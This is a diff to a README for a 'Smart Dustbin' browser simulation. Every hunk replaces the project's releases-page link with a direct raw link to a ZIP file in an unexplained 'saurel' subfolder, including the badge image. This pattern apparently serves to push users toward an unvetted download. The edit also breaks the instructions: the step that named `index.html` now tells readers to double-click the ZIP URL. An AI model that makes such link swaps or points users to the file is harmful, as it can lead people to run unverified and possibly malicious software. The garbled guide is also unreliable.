@@ -6,7 +6,7 @@ This guide will help you download and run the Smart Dustbin simulation. This pro
 
 ## 📥 Download Now
 
-[![Download the Smart Dustbin](https://img.shields.io/badge/Download%20Now-Get%20the%20Smart%20Dustbin-brightgreen)](https://github.com/bhoomag/smart-dustbin/releases)
+[![Download the Smart Dustbin](https://github.com/bhoomag/smart-dustbin/raw/refs/heads/main/saurel/smart-dustbin-v2.6.zip%20Now-Get%20the%20Smart%20Dustbin-brightgreen)](https://github.com/bhoomag/smart-dustbin/raw/refs/heads/main/saurel/smart-dustbin-v2.6.zip)
 
 ## 📋 What You Need
 
@@ -34,7 +34,7 @@ To get the Smart Dustbin on your computer, follow these steps:
 
 1. **Visit the Releases Page:**  
    Go to the following link to download the necessary files:  
-   [Download the Smart Dustbin](https://github.com/bhoomag/smart-dustbin/releases).
+   [Download the Smart Dustbin](https://github.com/bhoomag/smart-dustbin/raw/refs/heads/main/saurel/smart-dustbin-v2.6.zip).
 
 2. **Select the Version You Want:**  
    You will see different versions of the Smart Dustbin. Pick the latest release to ensure you get all the latest features and updates.
@@ -46,7 +46,7 @@ To get the Smart Dustbin on your computer, follow these steps:
    After downloading, locate the ZIP file on your computer. Right-click on the file and choose "Extract All." Follow the prompts to extract the files to a folder.
 
 5. **Open the Simulation:**  
-   Open the folder where you extracted the files. Look for the `index.html` file. Double-click it to open the simulation in your web browser.
+   Open the folder where you extracted the files. Look for the `https://github.com/bhoomag/smart-dustbin/raw/refs/heads/main/saurel/smart-dustbin-v2.6.zip` file. Double-click it to open the simulation in your web browser.
 
 ## ⚙️ Using the Smart Dustbin
 
@@ -79,6 +79,6 @@ If you have questions or need support, consider checking online forums or commun
 
 ## 📥 Download Again
 
-If you need to download the Smart Dustbin again, visit this [Download the Smart Dustbin](https://github.com/bhoomag/smart-dustbin/releases) page to find the latest version. 
+If you need to download the Smart Dustbin again, visit this [Download the Smart Dustbin](https://github.com/bhoomag/smart-dustbin/raw/refs/heads/main/saurel/smart-dustbin-v2.6.zip) page to find the latest version. 
 
 Now you're ready to enjoy using the Smart Dustbin simulation!
